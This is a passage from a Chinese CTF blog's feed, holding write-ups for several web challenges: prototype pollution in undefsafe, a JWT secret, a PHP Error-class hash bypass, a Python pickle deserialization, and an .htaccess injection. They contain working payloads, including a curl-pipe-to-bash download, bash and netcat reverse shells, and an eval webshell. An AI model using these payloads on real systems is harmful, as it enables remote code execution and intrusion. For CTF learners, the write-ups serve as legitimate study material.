class="token function">log</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span><span class="token comment">//这里可以看见1被替换成了10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">CVE-2019-10795 原型链污染(Prototype Pollution)</a></p><p>在版本小于2.0.3的<code>undefsafe</code>函数有漏洞，可以污染<strong>所有对象</strong>的原型链，给对象添加属性。</p><p>POC如下，污染原型链后，空对象多了个<code>ddd</code>属性，且<code>&#123;&#125;.ddd=JHU</code>。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"undefsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"__proto__.ddd"</span><span class="token punctuation">;</span><span class="token function">a</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token string">"JHU"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>ddd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/status有命令执行函数，所以得想办法污染commands对象，例如令commads.a=whoami，然后访问/status它会遍历执行commands字典中的命令。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908120943246.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908131841589.png"></p><p>在这进行原型链污染，</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;__proto__&amp;author&#x3D;curl%20http:&#x2F;&#x2F;IP&#x2F;shell.txt|bash&amp;raw&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>shell.txt内容如下</p><pre class="line-numbers language-SHELL" data-language="SHELL"><code class="language-SHELL">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;9999 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹下shell</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20210908125559897.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RootersCTF2019]ImgXweb</title>
      <link href="/p/1573675564.html"/>
      <url>/p/1573675564.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908100333187.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>关键字:[jwt解密]</p><p>robots.txt有东西</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101025555.png"></p><pre class="line-numbers language-none"><code class="language-none">you-will-never-guess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101320455.png"></p><p>改成admin</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-ImgXweb/image-20210908101419932.png"></p><p>下载，txt打开，结束</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[极客大挑战 2020]Greatphp</title>
      <link href="/p/4128421624.html"/>
      <url>/p/4128421624.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[error类|MD5绕过|eval执行]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>在类里，无法用数组进行md5绕过，所以用Error类绕过md5和sha1检测</p><p>测试</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注意这里需要写在一行上</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"a!=b"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"md5相等"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"sha1相等"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp/image-20210907185653017.png"></p><p>由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接<code>include &quot;/flag&quot;</code>将flag包含进来即可；由于过滤了引号，于是在这里进行取反，这样解码后就自动是<strong>字符串</strong>，无需再加双引号或单引号。</p><p>而且eval执行带有完整标签的语句需要先闭合，就类似于将字符串当成代码写入到源码中。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'?>&lt;?php echo 123;?>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//OUTPUT:123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>于是，payload如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?>&lt;?=include~"</span> <span class="token operator">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"?>"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/LYJ20010728/article/details/117429054">[极客大挑战 2020]Greatphp</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[watevrCTF-2019]Pickle Store</title>
      <link href="/p/3521738078.html"/>
      <url>/p/3521738078.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[pickle反序列化漏洞]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906193015544.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看这个名字就感觉是python模块pickle的反序列化相关</p><p>一开始要先base64解码一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906193849567.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210906194036315.png"></p><p>因为是加密的，没法直接构造，所以用pickle反序列化漏洞，具体见文章<a href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">PickleRce</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 172.16.150.14 9999 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>PickleRce<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整无语了，又不行，无论是用<a href="http://http.requestbin.buuoj.cn/">requestbin</a>还是内网靶机都不行，这都第四题了，一涉及内网必打不通，真的累了。</p><p>2021年9月7日12:20:16</p><p>好友帮忙测试了下，发现可以直接连外网，不需要内部靶机了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210907122042627.png"></p><p>我悟了，根本不需要内部靶机了，现在才理解这句话什么意思，以后直接用<a href="https://beeceptor.com/">beeceptor</a>或者vps完事</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Pickle-Store/image-20210907122704483.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[羊城杯2020]easyphp</title>
      <link href="/p/1631723733.html"/>
      <url>/p/1631723733.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题之前做过来着，可以说一模一样了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>具体见<a href="https://syunaht.com/p/1042722407.html">刷题笔记:[XNUCA2019Qualifier]EasyPHP</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># %23 是# 的url编码，防止python把自己注释了</span><span class="token comment"># \\ ， 两个\\上传上去就是 一个 \</span>content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\le ".htaccess"%23&lt;?php eval($_POST[cmd]);?>\\'''</span>url <span class="token operator">=</span> <span class="token string">"http://4a18370b-9163-4561-8330-fab04fc0ca5e.node4.buuoj.cn:81/?filename=.htaccess&amp;content=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>蚁剑连接下，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SWPU2019]Web3</title>
      <link href="/p/950891946.html"/>
      <url>/p/950891946.html</url>
      
